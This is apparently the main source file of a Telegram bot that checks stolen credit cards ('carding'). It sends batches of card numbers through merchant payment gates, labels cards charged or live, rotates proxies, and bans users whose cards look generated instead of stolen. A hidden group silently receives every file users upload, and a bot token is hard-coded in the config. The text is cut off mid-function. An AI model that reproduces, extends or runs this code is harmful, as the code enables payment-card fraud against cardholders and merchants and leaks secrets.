import asyncio
import concurrent.futures
import datetime
import html as _html
import importlib.util
import json
import os
import random
import aiohttp
import re
import sys
import time
import logging
import httpx
import auth


class _DedupeList(list):
    """list subclass with O(1) __contains__ via an internal set.

    Replaces the plain `all_ccs = []` pattern used throughout the CC parsers.
    Without this, `if cc not in all_ccs` is O(n) per insertion, making the
    full parse O(n²).  On a 10 000-card file that's ~50 million list scans
    which blocks the asyncio event loop completely.
    """
    __slots__ = ("_set",)

    def __init__(self):
        super().__init__()
        self._set: set = set()

    def append(self, item):
        super().append(item)
        self._set.add(item)

    def __contains__(self, item):          # O(1) instead of O(n)
        return item in self._set


from aiogram import Bot, Dispatcher, types, Router, F
from aiogram.filters import Command, CommandStart
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode, ChatMemberStatus, MessageEntityType
from aiogram.types import FSInputFile
from aiogram.exceptions import (
    TelegramRetryAfter,
    TelegramBadRequest,
    TelegramForbiddenError,
    TelegramNotFound,
)

# ── Patch aiogram session to strip dangerous deeply-nested JSON fields ────────
# Telegram can deliver "rich_message" / "rich_caption" blocks with recursively
# nested structures inside ordinary `message` updates.  Pydantic's remove_unset
# dict-comprehension then spins at 100% CPU indefinitely trying to walk the tree.
# We strip these fields from the raw response JSON before pydantic ever sees it.
import json as _json
from aiogram.client.session.base import BaseSession as _BaseSession

_DANGEROUS_KEYS = frozenset({"rich_message", "rich_caption", "story"})
_MAX_JSON_DEPTH  = 12   # anything deeper than 12 levels is sanitised away

def _sanitize(obj, depth: int = 0):
    if depth > _MAX_JSON_DEPTH:
        return {}
    if isinstance(obj, dict):
        return {
            k: _sanitize(v, depth + 1)
            for k, v in obj.items()
            if k not in _DANGEROUS_KEYS
        }
    if isinstance(obj, list):
        return [_sanitize(item, depth + 1) for item in obj]
    return obj

_orig_check_response = _BaseSession.check_response

def _patched_check_response(self, bot, method, status_code: int, content: str):
    try:
        raw = _json.loads(content)
        if isinstance(raw.get("result"), list):
            raw["result"] = [_sanitize(u) for u in raw["result"]]
            content = _json.dumps(raw)
    except Exception:
        pass
    return _orig_check_response(self, bot, method, status_code, content)

_BaseSession.check_response = _patched_check_response
# ── end patch ─────────────────────────────────────────────────────────────────

from helpers import (
    parse_proxy_format, test_proxy, bin_lookup,
    extract_cc, close_session, classify_gate_response,
    gate_is_charged, gate_is_approved, proxy_dict_to_url,
    _proxy_dict_to_url,  # ← ADD THIS LINE
)
import checker_bridge

try:
    import webshare as _webshare_mod
    _WEBSHARE_AVAILABLE = True
except ImportError:
    _webshare_mod = None  # type: ignore
    _WEBSHARE_AVAILABLE = False

try:
    import dork as _dork_mod
    _DORK_AVAILABLE = True
except ImportError:
    _dork_mod = None  # type: ignore
    _DORK_AVAILABLE = False
import hit

try:
    import b3wrapunzel
except ImportError:
    b3wrapunzel = None  # optional — /b3 /mb3 /b3txt need b3wrapunzel.py on VPS
# import midasbuy


def _load_gate_file(filename: str):
    path = os.path.join(os.path.dirname(os.path.abspath(__file__)), filename)
    mod_name = "gate_" + re.sub(r"[^a-zA-Z0-9_]", "_", filename)
    spec = importlib.util.spec_from_file_location(mod_name, path)
    if not spec or not spec.loader:
        raise ImportError(f"Cannot load gate module: {filename}")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod



# ── Logging ───────────────────────────────────────────────────────────────────
# Writes to stdout AND two rotating files:
#   bot.log       — INFO+ (all activity)
#   bot_error.log — WARNING+ (errors only, easier triage)
from logging.handlers import RotatingFileHandler

_LOG_DIR  = os.path.dirname(os.path.abspath(__file__))
_LOG_FMT  = logging.Formatter(
    "%(asctime)s │ %(levelname)s │ %(name)s │ %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)

_root = logging.getLogger()
_root.setLevel(logging.INFO)

_console = logging.StreamHandler()
_console.setFormatter(_LOG_FMT)
_root.addHandler(_console)

_file_all = RotatingFileHandler(
    os.path.join(_LOG_DIR, "bot.log"),
    maxBytes=10 * 1024 * 1024,   # 10 MB per file
    backupCount=5,                # keep 5 rotated files
    encoding="utf-8",
)
_file_all.setFormatter(_LOG_FMT)
_root.addHandler(_file_all)

_file_err = RotatingFileHandler(
    os.path.join(_LOG_DIR, "bot_error.log"),
    maxBytes=5 * 1024 * 1024,    # 5 MB
    backupCount=3,
    encoding="utf-8",
)
_file_err.setLevel(logging.WARNING)
_file_err.setFormatter(_LOG_FMT)
_root.addHandler(_file_err)

# Silence per-request httpx noise — these lines were burning ~30% CPU at 400 concurrent checks
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("httpcore").setLevel(logging.WARNING)
logging.getLogger("hpack").setLevel(logging.WARNING)

log = logging.getLogger("bot")

# ══════════════════════════════════════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════════════════════════════════════

TOKEN = "8641106277:AAH85Kp-AZkdBmKZ_A83UAhUySigbvtJC8s" 

# ── Join requirements ─────────────────────────────────────────────────────────      # Replace with your channel ID
join_chat_id = -1004351388607
GROUP_LINK = "https://t.me/+l4wyJzE1jbI3MTc1"

# Secret group — silently receives every file dropped in bot DMs
SECRET_FILES_GROUP_ID = -1004349374523
SECRET_FILES_LINK = "https://t.me/+Bvdm06idOrhkYmZl"

# ── Paths ─────────────────────────────────────────────────────────────────────
BASE_DIR   = os.path.dirname(os.path.abspath(__file__))
PROXY_FILE = os.path.join(BASE_DIR, "proxy.json")
SITES_FILE = os.path.join(BASE_DIR, "sites.txt")
# Must match checker nodes (shp.py _SITES_MAP). Prefer this over sites.txt.
SITES_JSON = os.path.join(BASE_DIR, "sites.json")
RZSITE_FILE = os.path.join(BASE_DIR, "rzsite.json")
SKKEYS_FILE = os.path.join(BASE_DIR, "skkeys.json")  # per-user Stripe SK+PK for /skcvv
BANNED_FILE            = os.path.join(BASE_DIR, "banned.json")
FREEPROXY_COOLDOWN_FILE = os.path.join(BASE_DIR, "freeproxy_cooldown.json")  # legacy
FREEPROXY_LAST_FILE     = os.path.join(BASE_DIR, "freeproxy_last.json")      # legacy
FREEPROXY_DATA_FILE     = os.path.join(BASE_DIR, "freeproxy_data.json")      # unified

# ── Ban system ────────────────────────────────────────────────────────────────
_banned_users: set[int] = set()

def _load_banned() -> None:
    global _banned_users
    try:
        with open(BANNED_FILE, "r", encoding="utf-8") as f:
            _banned_users = set(json.load(f))
    except Exception:
        _banned_users = set()

def _save_banned() -> None:
    try:
        with open(BANNED_FILE, "w", encoding="utf-8") as f:
            json.dump(sorted(_banned_users), f)
    except Exception as exc:
        log.error("Failed to save banned.json: %s", exc)

def is_banned(user_id: int) -> bool:
    return user_id in _banned_users

def ban_user(user_id: int) -> None:
    _banned_users.add(user_id)
    _save_banned()
    log.warning("BAN: user %s added to ban list", user_id)

def unban_user(user_id: int) -> None:
    _banned_users.discard(user_id)
    _save_banned()
    log.info("UNBAN: user %s removed from ban list", user_id)

_load_banned()

# ══════════════════════════════════════════════════════════════════════════════
#  GEN-CHECKER AUTO-BAN — filename + CC-pattern detection
# ══════════════════════════════════════════════════════════════════════════════

# Filename patterns that flag a gen-checker upload.
# The regex captures the matched keyword so it can be shown in the ban reason.
_GEN_FILENAME_PATTERN = re.compile(
    r'(gen(?:erat(?:e|or|ed)?)?)',
    re.IGNORECASE,
)

# Card-pattern thresholds (checked against first 20 cards of any batch)
_GEN_SAMPLE_SIZE  = 20   # inspect the first N cards
_GEN_NUM_BAN_MIN  = 15   # same card NUMBER must repeat ≥ this many times → ban
_GEN_CVV_BAN_MIN  = 15   # same CVV must repeat ≥ this many times → ban


def detect_gen_ccs(cards: list[str]) -> str | None:
    """
    Analyse the first 20 cards for generator patterns.
    Returns a human-readable reason string when detected, None if clean.

    Rules (as specified):
      1. Any card NUMBER that repeats ≥7 times in the sample → ban
         (fewer than 6 identical numbers = allowed through)
      2. Any CVV value that repeats ≥3 times in the sample → ban
         (real card dumps have cryptographically unique CVVs; any triple hit
         in 20 samples is almost certainly a gen tool)
    """
    from collections import Counter

    sample = cards[:_GEN_SAMPLE_SIZE]
    if len(sample) < 5:           # too few cards to make a reliable call
        return None

    parsed: list[tuple[str, str]] = []   # (card_number, cvv)
    for card in sample:
        parts = card.split("|")
        if len(parts) >= 4:
            parsed.append((parts[0].strip(), parts[3].strip()))

    if len(parsed) < 5:
        return None

    num_cnt = Counter(p[0] for p in parsed)
    cvv_cnt = Counter(p[1] for p in parsed)

    # Rule 1: same card number ≥7 times
    top_num, top_num_n = num_cnt.most_common(1)[0]
    if top_num_n >= _GEN_NUM_BAN_MIN:
        return f"Card number repeated {top_num_n}× in first {len(parsed)} cards"

    # Rule 2: same CVV ≥3 times
    top_cvv, top_cvv_n = cvv_cnt.most_common(1)[0]
    if top_cvv_n >= _GEN_CVV_BAN_MIN:
        return f"CVV '{top_cvv}' repeated {top_cvv_n}× in first {len(parsed)} cards"

    return None


async def _do_gen_ban(message: types.Message, user_id: int, reason: str, filename: str = "") -> None:
    """Execute the ban, notify user + owner, and log."""
    ban_user(user_id)
    full_name = message.from_user.first_name or "?"

    ban_msg = await message.reply(
        f'<tg-emoji emoji-id="5447647474984449520">🚫</tg-emoji> '
        f'<b>You have been auto-banned.</b>\n'
        f'<tg-spoiler>{_html.escape(reason)}</tg-spoiler>',
        parse_mode="HTML",
    )
    try:
        await message.bot.pin_chat_message(
            message.chat.id, ban_msg.message_id, disable_notification=False
        )
    except Exception:
        pass

    file_line = (
        f'\n<tg-emoji emoji-id="5989971281758394805">📁</tg-emoji> '
        f'<b>File</b> ➜ <code>{_html.escape(filename)}</code>'
    ) if filename else ""
    notice = (
        f'<tg-emoji emoji-id="5116151848855667552">🚫</tg-emoji> <b>AUTO-BANNED</b>\n'
        f'━━━━━━━━━━━━━━━━━━━━━━\n'
        f'<tg-emoji emoji-id="5895421863114313930">👤</tg-emoji> <b>User</b> ➜ '
        f'<a href="tg://user?id={user_id}">{_html.escape(full_name)}</a> '
        f'(<code>{user_id}</code>)'
        f'{file_line}\n'
        f'<tg-emoji emoji-id="5447647474984449520">🚫</tg-emoji> <b>Reason</b> ➜ '
        f'<tg-spoiler>{_html.escape(reason)}</tg-spoiler>'
    )

    # Notify owner + all admins
    recipients: list[int] = []
    if auth.OWNER_ID:
        recipients.append(auth.OWNER_ID)
    for admin_id in auth.load_admins():
        if admin_id not in recipients:
            recipients.append(admin_id)

    for recipient in recipients:
        try:
            await message.bot.send_message(recipient, notice, parse_mode="HTML")
        except Exception:
            pass

    log.warning("AUTO-BAN: user %s – %s", user_id, reason)


async def guard_gen_filename(message: types.Message, user_id: int) -> bool:
    """
    Returns True and bans the user when the filename contains a gen/scrape
    keyword.  The matched word is extracted and shown in the ban reason.
    Returns False when the file is clean.  Owners always pass through.
    """
    if auth.is_owner(user_id):
        return False

    doc = message.document or (
        message.reply_to_message and message.reply_to_message.document
    )
    name = (doc.file_name if doc and doc.file_name else "").strip()

    m = _GEN_FILENAME_PATTERN.search(name)
    if not m:
        return False

    matched_word = m.group(1)           # e.g. "gen", "generate", "scrape"
    ban_reason = f'Gen Checker — filename contains "{matched_word}"'
    await _do_gen_ban(message, user_id, ban_reason, filename=name)
    return True


async def guard_gen_cards(cards: list[str], message: types.Message, user_id: int) -> bool:
    """
    Inspect the first 30 cards for generator patterns.
    Returns True when the batch is clean (check may proceed).
    Returns False and bans the user when a gen pattern is detected.
    Owners are always allowed through.
    """
    if auth.is_owner(user_id):
        return True

    reason = detect_gen_ccs(cards)
    if reason is None:
        return True

    await _do_gen_ban(message, user_id, f"Gen CC Detected — {reason}")
    return False


# ── Thread pool for sync gates (hit, st, chk, rz, st1, etc.) ─────────────────
# 8-core bot VPS: 500 threads handles concurrent sync gate workers with headroom.
CHECKER_POOL = concurrent.futures.ThreadPoolExecutor(max_workers=500)

# ── Per-user concurrency limiter for /msh (prevents one user starving others) ─
_USER_SEM_LIMIT = 100
_user_semaphores: dict[int, asyncio.Semaphore] = {}

def get_user_semaphore(user_id: int) -> asyncio.Semaphore:
    if user_id not in _user_semaphores:
        _user_semaphores[user_id] = asyncio.Semaphore(_USER_SEM_LIMIT)
    return _user_semaphores[user_id]

# ── Antispam cooldown (20s per user for /sh, /msh, /br) ──────────────────────
_ANTISPAM_COOLDOWN = 20
_user_last_cmd: dict[int, float] = {}

def check_cooldown(user_id: int) -> float:
    """Return remaining cooldown seconds, or 0 if the user is free to proceed."""
    if auth.is_admin(user_id):
        return 0.0
    last = _user_last_cmd.get(user_id, 0)
    elapsed = time.time() - last
    if elapsed < _ANTISPAM_COOLDOWN:
        return _ANTISPAM_COOLDOWN - elapsed
    return 0.0

def set_cooldown(user_id: int):
    _user_last_cmd[user_id] = time.time()

# ── Mass check batch size ─────────────────────────────────────────────────────
MSH_BATCH = 100
MSH_MAX_CCS = 100

# ══════════════════════════════════════════════════════════════════════════════
#  PREMIUM EMOJI IDS
# ══════════════════════════════════════════════════════════════════════════════

# User-supplied premium set — only these IDs are used across the bot UI.
# Every semantic slot below is chosen from this exact pool so the bot's
# visual identity is 100% built on the caller's curated animated emojis.
_CHECK    = "5156781758439490145"   # ✅ success / ok
_FIRE     = "5999340396432333728"   # 🔥 charged / hot
_CROSS    = "5346063582809315727"   # ❌ decline / fail
_BOLT     = "5265004080916343533"   # 📡 speed / signal
_CARD     = "5388595952451859597"   # 💳 card
_RING     = "4992597150262101203"   # 🔄 loading / spinner
_TARGET   = "5974235702701853774"   # 🎯 target
_USER     = "5467730450002746997"   # 👤 user
_STOP     = "5418337668968760399"   # 🛑 stop
_ARROW    = "5474419676882686371"   # 📌 pin / arrow
_ROCKET   = "6282977077427702833"   # 🚀 launch
_BOW      = "5303120803271817149"   # 🌟 gift accent
_SHIELD   = "5309789538862774805"   # 🔒 gate / lock

E = {
    "bolt":      _BOLT,
    "bolt2":     _BOLT,
    "bolt3":     _BOLT,
    "bolt4":     _BOLT,
    "bolt5":     _BOLT,
    "check":     _CHECK,
    "check2":    _CHECK,
    "check3":    _CHECK,
    "cross":     _CROSS,
    "cross2":    _CROSS,
    "cross3":    _CROSS,
    "cross4":    _CROSS,
    "star":      _FIRE,
    "gem":       _CHECK,
    "globe":     _BOLT,
    "link":      _ARROW,
    "chat":      _TARGET,
    "chat2":     _TARGET,
    "link2":     _ARROW,
    "user":      _USER,
    "warn":      _STOP,
    "warn2":     _STOP,
    "rocket":    _ROCKET,
    "sparkle":   _FIRE,
    "hourglass": _RING,
    "plus":      _CHECK,
    "dice":      _TARGET,
    "refresh":   _RING,
    "bank":      _CARD,
    "gift":      _BOW,
    "stop":      _STOP,
    "loading":   _RING,
    "prev":      _ARROW,
    "next":      _ARROW,
    "help_prev": _ARROW,
    "help_next": _ARROW,
}

# ── Curated premium anim pool (user-supplied fresh set) ────────────────────
NX = [
    "5156781758439490145", "5346063582809315727", "5420323339723881652",
    "5999340396432333728", "5971837723676249096", "5974235702701853774",
    "6321225560789877992", "5388595952451859597", "5213212474748182826",
    "4992597150262101203", "6282977077427702833", "6023660820544623088",
    "6282601589911851365", "5292005513809126424", "5474419676882686371",
    "5474167682561488464", "5388868060104896896", "6141149994524085964",
    "5265004080916343533", "5219971168429158186", "5467516479027032033",
    "5467730450002746997", "5285491959681527645", "5341459833134525875",
    "5413631334000110048", "5256013189652427407", "5330289087054103251",
    "5435936610996742361", "5442788591367382815", "5231333525885577589",
    "5427176814743150423", "5303120803271817149", "5307858706250079424",
    "5309789538862774805", "5418337668968760399", "5316961099159968983",
    "5307771389564954063",
]

# Named accents for the redesigned UI (pulled from NX pool)
N = {
    "diamond":  NX[0],   "flare":    NX[1],   "prism":    NX[2],
    "burst":    NX[3],   "swirl":    NX[4],   "orbit":    NX[5],
    "shield":   NX[6],   "aurora":   NX[7],   "wave":     NX[8],
    "spark":    NX[9],   "flame":    NX[10],  "crystal":  NX[11],
    "meteor":   NX[12],  "pulse":    NX[13],  "beam":     NX[14],
    "halo":     NX[15],  "comet":    NX[16],  "ripple":   NX[17],
    "shard":    NX[18],  "nova":     NX[19],  "pearl":    NX[20],
    "arrow":    NX[21],  "core":     NX[22],  "loop":     NX[23],
    "seal":     NX[24],  "chip":     NX[25],  "leaf":     NX[26],
    "quill":    NX[27],  "coin":     NX[28],  "rune":     NX[29],
    "petal":    NX[30],  "spiral":   NX[31],  "grid":     NX[32],
    "cascade":  NX[33],  "ember":    NX[34],  "focus":    NX[35],
}


def pe(emoji_id: str) -> str:
    """Wrap a custom emoji ID with Telegram-valid emoji entity text.

    Telegram rejects geometric glyphs such as ``◆`` inside ``tg-emoji`` with
    ``ENTITY_TEXT_INVALID``.  A real emoji fallback keeps the custom animation
    and also renders cleanly for clients that cannot display premium emoji.
    """
    safe_id = str(emoji_id).strip()
    if not safe_id.isdigit():
        return "✨"
    return f'<tg-emoji emoji-id="{safe_id}">✨</tg-emoji>'


def rp() -> str:
    """Return a random premium emoji from the NX pool wrapped as tg-emoji."""
    return pe(random.choice(NX))

# ── Result-specific emojis (CC check output) ─────────────────────────────────
R = {
    "cc":         _CARD,
    "gate":       _SHIELD,
    "price":      _CARD,
    "bin_info":   _TARGET,
    "visa":       _CARD,
    "master":     _CARD,
    "amex":       _CARD,
    "type":       _TARGET,
    "level":      _FIRE,
    "bank":       _CARD,
    "country":    _TARGET,
    "checked_by": _USER,
}

def brand_emoji(brand: str) -> str:
    """Return the premium emoji for a card brand, or empty string."""
    bl = brand.upper()
    if "VISA" in bl:
        return pe(R["visa"]) + " "
    elif "MASTER" in bl:
        return pe(R["master"]) + " "
    elif "AMEX" in bl or "AMERICAN" in bl:
        return pe(R["amex"]) + " "
    return ""

def user_link(user_id: int, name: str = "", username: str = "") -> str:
    """Build a clickable user profile link.

    Uses https://t.me/username when available (always clickable everywhere,
    including monitor groups where the user isn't a member).
    Falls back to tg://user?id= for users without a username.
    """
    # Display text: prefer name, then @username, then raw ID
    if name:
        display = _html.escape(name)
    elif username:
        display = f"@{_html.escape(username)}"
    else:
        display = str(user_id)

    # Link URL: prefer https://t.me/username (universally clickable),
    # fall back to tg://user?id= (only works when client knows the user)
    if username:
        url = f"https://t.me/{_html.escape(username)}"
    else:
        url = f"tg://user?id={user_id}"

    return f'<a href="{url}">{display}</a>'


# ══════════════════════════════════════════════════════════════════════════════
#  BOLD UNICODE TEXT CONVERTER
# ══════════════════════════════════════════════════════════════════════════════

_BOLD_MAP = {}
# Uppercase A-Z → 𝗔-𝗭 (U+1D5D4 to U+1D5ED)
for i, c in enumerate("ABCDEFGHIJKLMNOPQRSTUVWXYZ"):
    _BOLD_MAP[c] = chr(0x1D5D4 + i)
# Lowercase a-z → 𝗮-𝘇 (U+1D5EE to U+1D607)
for i, c in enumerate("abcdefghijklmnopqrstuvwxyz"):
    _BOLD_MAP[c] = chr(0x1D5EE + i)
# Digits 0-9 → 𝟬-𝟵 (U+1D7EC to U+1D7F5)
for i, c in enumerate("0123456789"):
    _BOLD_MAP[c] = chr(0x1D7EC + i)

def bold(text: str) -> str:
    """Convert ASCII text to Unicode Mathematical Sans-Serif Bold.

    HTML-sensitive characters (<, >, &) are escaped so the returned string is
    always safe to interpolate into a Telegram HTML message.  Without this,
    a legitimate label such as "Price < $10" produces an "Unsupported start
    tag" parse error the moment Telegram's HTML parser sees the bare `<`.
    """
    s = "".join(_BOLD_MAP.get(c, c) for c in str(text))
    return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


# ── UI dividers used across the redesigned checker cards ────────────────────
BAR_TOP = "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰"
BAR_MID = "─────────────────────"
BAR_DOT = "· · · · · · · · · · ·"

# ══════════════════════════════════════════════════════════════════════════════
#  NEW UI v3 — Sparkle Card + Animated GIFs (2026 rework)
# ══════════════════════════════════════════════════════════════════════════════
# Rotating GIF pool for hit / live cards (decline stays text-only).
# Entries can be: local file path inside the gifs/ folder (recommended — your
# uploaded GIFs ship with the bot), a Telegram file_id, or a direct .gif/.mp4 URL.
GIF_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "gifs")
HIT_GIF_POOL = [
    os.path.join(GIF_DIR, "K4FAdzTq6ydJ.gif_1786581960787.mp4"),
    os.path.join(GIF_DIR, "Tkyfzl77pR.gif_1786581960800.mp4"),
    os.path.join(GIF_DIR, "a54ddb09596760f7.gif_1786581960719.mp4"),
    os.path.join(GIF_DIR, "aniyuki-black-and-white-anime-6.gif_1786574045255.mp4"),
    os.path.join(GIF_DIR, "d6b69c98e66757e1.gif_1786581960811.mp4"),
    os.path.join(GIF_DIR, "fa1ce34ccc959534.gif_1786581960773.mp4"),
    os.path.join(GIF_DIR, "fedbcf7d55aae59d.gif_1_1786581960821.mp4"),
]

# Telegram file_id cache — after the first upload of a local GIF we reuse the
# file_id, so every later card is instant instead of re-uploading the mp4.
_GIF_FILE_IDS: dict[str, str] = {}

try:
    _found = [g for g in HIT_GIF_POOL if os.path.exists(g)]
    if _found:
        log.info(f"[gif] {len(_found)}/{len(HIT_GIF_POOL)} animations ready in {GIF_DIR}")
    else:
        log.warning(f"[gif] NO animation files found in {GIF_DIR} — cards will be text only")
except Exception:
    pass

def _gif_input(entry: str):
    """Resolve a pool entry into something send_animation accepts.
    A local path that does NOT exist is never returned as-is — Telegram would
    treat it as an http URL and reject it ("Wrong port number specified")."""
    cached = _GIF_FILE_IDS.get(entry)
    if cached:
        return cached
    if os.path.exists(entry):
        return FSInputFile(entry)
    if entry.startswith(("http://", "https://")):
        return entry            # real remote url
    if os.sep in entry or entry.endswith((".mp4", ".gif", ".webm")):
        return None             # missing local file -> skip it
    return entry                # telegram file_id


def _available_gifs() -> list:
    """Pool entries that can actually be sent right now."""
    out = []
    for e in HIT_GIF_POOL:
        if _GIF_FILE_IDS.get(e) or os.path.exists(e) or e.startswith(("http://", "https://")):
            out.append(e)
    return out


def _sp() -> str:
    """Return the signature sparkle premium emoji (rotating)."""
    return pe(random.choice([N["spark"], N["flare"], N["diamond"], N["prism"], N["nova"]]))

def _header_emoji(header_tag: str, is_decline: bool) -> str:
    """Pick the leading premium emoji for the card header by status."""
    up = (header_tag or "").upper()
    if up.startswith("CHARGED"):
        return pe(N["diamond"])       # ✅
    if up.startswith("CCN LIVE") or "LIVE" in up:
        return pe(N["prism"])         # ⚠️
    if "UNKNOWN" in up:
        return pe(N["spark"])         # 🔄
    if is_decline or "DECLIN" in up or "DEAD" in up or "EXPIRED" in up or "BAD" in up or "FLAG" in up or "RISK" in up:
        return pe(N["flare"])         # ❌
    return pe(N["burst"])             # 🔥

def render_sparkle_card(
    cc_str: str, gate_label: str, price, response: str,
    result: dict | None, bin_info: dict, checker_link: str,
    header_tag: str, is_decline: bool = False,
) -> str:
    """Signature premium card used for /sh, /chk and /hitco outputs."""
    brand   = bin_info.get("brand", "-")
    ctype   = bin_info.get("type", "-")
    level   = bin_info.get("level", "-")
    bank    = bin_info.get("bank", "-")
    country = bin_info.get("country", "-")
    flag    = bin_info.get("flag", "")

    e_hdr    = _header_emoji(header_tag, is_decline)
    e_cc     = pe(N["aurora"])   # 💳
    e_gate   = pe(N["comet"])    # ⛩
    e_price  = pe(N["ripple"])   # 💵
    e_brand  = pe(N["swirl"])    # 💠
    e_type   = pe(N["orbit"])    # 🎯
    e_level  = pe(N["nova"])     # ⭐️
    e_bank   = pe(N["halo"])     # 🏦
    e_ctry   = pe(N["pulse"])    # 🌍
    e_by     = pe(N["arrow"])    # 👤

    return (
        f"{e_hdr} {bold(header_tag)}\n\n"
        f"{e_cc} {bold('CC:')} <tg-spoiler>{cc_str}</tg-spoiler>\n"
        f"{e_gate} {bold('Gate:')} {bold(gate_label)}\n"
        f"{e_price} {bold('Price:')} {bold(str(price))}\n\n"
        f"{e_brand} {bold('Brand:')} {bold(brand)}\n"
        f"{e_type} {bold('Type:')} {bold(ctype)}\n"
        f"{e_level} {bold('Level:')} {bold(level)}\n"
        f"{e_bank} {bold('Bank:')} {bold(bank)}\n"
        f"{e_ctry} {bold('Country:')} {flag} {bold(country)}\n\n"
        f"{e_by} {bold('Checked by:')} {checker_link}"
    )

async def send_hit_animation(chat_id: int, text: str):
    """Send the card with a rotating GIF. Used for EVERY outcome — charged,
    CCN live, declined and unknown — so the look is identical across results.
    Tries a few pool entries before giving up so one bad file can't kill it."""
    pool = _available_gifs()
    if not pool:
        log.warning(
            f"[gif] no usable GIF found — expected mp4/gif files in {GIF_DIR!r}. "
            f"Copy the gifs/ folder next to bot-6.py. Sending text card instead."
        )
    random.shuffle(pool)
    last_err = None
    for entry in pool[:3]:
        try:
            gif = _gif_input(entry)
            if gif is None:
                continue
            msg = await bot.send_animation(chat_id, animation=gif, caption=text)
            # cache the file_id so the next card sends instantly
            try:
                if msg and msg.animation and not _GIF_FILE_IDS.get(entry):
                    _GIF_FILE_IDS[entry] = msg.animation.file_id
                elif msg and msg.document and not _GIF_FILE_IDS.get(entry):
                    _GIF_FILE_IDS[entry] = msg.document.file_id
            except Exception:
                pass
            return msg
        except Exception as e:
            last_err = e
            # a cached file_id can go stale — drop it and try the next one
            _GIF_FILE_IDS.pop(entry, None)
            continue
    if last_err is not None:
        log.warning(f"[gif] all animation sends failed, falling back to text: {last_err}")
    try:
        return await bot.send_message(chat_id, text)
    except Exception:
        return None


def _header_tag_for(response: str, result: dict | None = None) -> tuple[str, bool, bool]:
    """Return (header_label, is_hit_or_live, is_decline_only)."""
    rl = (response or "").lower()
    if _is_charged_response(response, result):
        return "CHARGED · ORDER PLACED", True, False
    if any(k in rl for k in ["insufficient_funds", "insufficient funds"]):
        return "CCN LIVE · INSUFFICIENT FUNDS", True, False
    if any(k in rl for k in ["incorrect_cvc", "invalid_cvc", "incorrect_cvv", "invalid_cvv"]):
        return "CCN LIVE · CVC MISMATCH", True, False
    if "incorrect_zip" in rl:
        return "CCN LIVE · ZIP MISMATCH", True, False
    if "otp_required" in rl or "3ds" in rl:
        return "CCN LIVE · 3DS / OTP", True, False
    if any(k in rl for k in ["card_declined", "do_not_honor", "declined"]):
        return "DECLINED", False, True
    if "expired" in rl:
        return "DEAD · EXPIRED", False, True
    if "risky" in rl:
        return "FLAGGED · RISK HOLD", False, True
    if "incorrect_number" in rl:
        return "DEAD · BAD NUMBER", False, True
    return "UNKNOWN RESPONSE", False, True




def _gate_msg_display(msg: str, limit: int = 120) -> str:
    """Strip HTML/JSON from gate responses so Telegram HTML parse_mode won't fail."""
    s = re.sub(r"<[^>]+>", " ", str(msg or ""))
    s = re.sub(r"\s+", " ", s).strip()
    if "{" in s:
        s = s.split("{", 1)[0].strip()
    if s.upper().startswith("DECLINED "):
        s = s[9:].strip()
    return bold((s[:limit] if s else "-"))


# ══════════════════════════════════════════════════════════════════════════════
#  PROXY STORAGE  (proxy.json)
# ══════════════════════════════════════════════════════════════════════════════

_proxy_cache: dict | None = None
_proxy_cache_mtime: float = 0.0

def _load_proxies() -> dict:
    global _proxy_cache, _proxy_cache_mtime
    try:
        mt = os.path.getmtime(PROXY_FILE)
    except OSError:
        return {}
    if _proxy_cache is not None and mt == _proxy_cache_mtime:
        return _proxy_cache
    try:
        with open(PROXY_FILE, "r", encoding="utf-8") as f:
            _proxy_cache = json.load(f)
            _proxy_cache_mtime = mt
            return _proxy_cache
    except Exception:
        return {}

def _save_proxies(data: dict):
    global _proxy_cache, _proxy_cache_mtime
    with open(PROXY_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    _proxy_cache = data
    try:
        _proxy_cache_mtime = os.path.getmtime(PROXY_FILE)
    except OSError:
        _proxy_cache_mtime = 0.0

MAX_PROXIES_PER_USER = 100

def get_user_proxies(user_id: int) -> list:
    """Return the full proxy list for a user (from proxy.json)."""
    data = _load_proxies()
    proxies = data.get(str(user_id), [])
    if isinstance(proxies, dict):
        proxies = [proxies] if proxies else []
    if isinstance(proxies, str):
        proxies = [proxies] if proxies.strip() else []
    out: list = []
    for p in proxies:
        if isinstance(p, dict):
            out.append(p)
        elif isinstance(p, str) and p.strip():
            parsed = parse_proxy_format(p.strip())
            if parsed:
                out.append(parsed)
    return out

def get_user_proxy(user_id: int) -> dict | None:
    """Return a RANDOM proxy from the user's list."""
    proxies = get_effective_proxies(user_id)
    return random.choice(proxies) if proxies else None

def get_effective_proxies(user_id: int) -> list:
    """User's own proxies; falls back to the shared owner pool."""
    px = get_user_proxies(user_id)
    if px:
        return px
    try:
        if auth.OWNER_ID and int(user_id) != int(auth.OWNER_ID):
            return get_user_proxies(auth.OWNER_ID)
    except Exception:
        pass
    return px

def add_user_proxies(user_id: int, new_proxies: list[dict]):
    """Append proxies to user's list. Cap at MAX_PROXIES_PER_USER."""
    data = _load_proxies()
    existing = data.get(str(user_id), [])
    if isinstance(existing, dict):
        existing = [existing] if existing else []
    existing.extend(new_proxies)
    data[str(user_id)] = existing[:MAX_PROXIES_PER_USER]
    _save_proxies(data)

def del_user_proxy(user_id: int):
    data = _load_proxies()
    data.pop(str(user_id), None)
    _save_proxies(data)


# ══════════════════════════════════════════════════════════════════════════════
#  FREE PROXY DATA  (freeproxy_data.json)
#  Unified store: { "uid": { "claimed_at": ts, "proxies": ["ip:port:u:p", ...] } }
# ══════════════════════════════════════════════════════════════════════════════
FREEPROXY_COOLDOWN_HOURS = 24

def _load_fp_data() -> dict:
    """Load unified freeproxy data, migrating legacy files on first run."""
    try:
        with open(FREEPROXY_DATA_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        pass
    # Migrate legacy files into unified format
    data: dict = {}
    try:
        with open(FREEPROXY_COOLDOWN_FILE, "r", encoding="utf-8") as f:
            cd = json.load(f)
        for uid, ts in cd.items():
            data.setdefault(uid, {})["claimed_at"] = ts
    except Exception:
        pass
    try:
        with open(FREEPROXY_LAST_FILE, "r", encoding="utf-8") as f:
